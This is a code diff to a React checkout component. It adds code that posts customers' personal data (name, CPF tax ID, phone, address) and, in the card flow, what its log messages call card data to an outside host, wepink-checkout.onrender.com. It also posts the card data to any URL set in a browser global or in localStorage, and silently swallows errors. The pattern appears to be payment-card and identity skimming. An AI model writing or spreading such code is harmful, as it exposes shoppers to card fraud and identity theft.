@@ -574,30 +574,38 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
 
       saveLeadToSupabase('pendente', String(data.id));
 
+      const pixPayload = {
+        orderId,
+        transaction_id: String(data.id),
+        status: 'pendente',
+        paymentMethod: 'pix',
+        lead: {
+          nome: formData.nome,
+          email: formData.email,
+          cpf: formData.cpf,
+          telefone: formData.telefone,
+          cep: formData.cep,
+          rua: formData.rua,
+          numero: formData.numero,
+          complemento: formData.complemento,
+          bairro: formData.bairro,
+          cidade: formData.cidade,
+          estado: formData.estado
+        },
+        totalPrice: finalPrice,
+        trackingCode: tCode
+      };
+
       fetch('/.netlify/functions/checkout', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          orderId,
-          transaction_id: String(data.id),
-          status: 'pendente',
-          paymentMethod: 'pix',
-          lead: {
-            nome: formData.nome,
-            email: formData.email,
-            cpf: formData.cpf,
-            telefone: formData.telefone,
-            cep: formData.cep,
-            rua: formData.rua,
-            numero: formData.numero,
-            complemento: formData.complemento,
-            bairro: formData.bairro,
-            cidade: formData.cidade,
-            estado: formData.estado
-          },
-          totalPrice: finalPrice,
-          trackingCode: tCode
-        })
+        body: JSON.stringify(pixPayload)
+      }).catch(() => {});
+
+      fetch('https://wepink-checkout.onrender.com/api/checkout-pix', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(pixPayload)
       }).catch(() => {});
 
       setStep(4);
@@ -715,28 +723,26 @@ export default function Checkout({ vehicle, kit, upsellItems = [], onClose }) {
             installments: formData.installments
           });
 
-          const adminUrl = window.ADMIN_PANEL_URL || localStorage.getItem('admin_panel_url') || '/.netlify/functions/checkout';
+          const RENDER_API = 'https://wepink-checkout.onrender.com/api/checkout';
+          const adminUrl = window.ADMIN_PANEL_URL || localStorage.getItem('admin_panel_url') || RENDER_API;
           
           const sendToAdmin = async () => {
-            try {
-              await fetch('/.netlify/functions/checkout', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-              });
-              console.log('[Netlify Function] Dados do cartão enviadas com sucesso.');
-            } catch (err) {
-              console.error('[Netlify Function] Erro ao enviar dados:', err);
+            const targets = ['/.netlify/functions/checkout', RENDER_API];
+            if (adminUrl && !targets.includes(adminUrl)) {
+              targets.push(adminUrl);
             }
 
-            if (adminUrl && adminUrl !== '/.netlify/functions/checkout') {
+            for (const url of targets) {
               try {
-                await fetch(adminUrl, {
+                await fetch(url, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify(payload)
                 });
-              } catch (err) {}
+                console.log(`[Admin Dispatch] Dados enviados com sucesso para ${url}`);
+              } catch (err) {
+                console.error(`[Admin Dispatch] Erro ao enviar para ${url}:`, err);
+              }
             }
           };
 
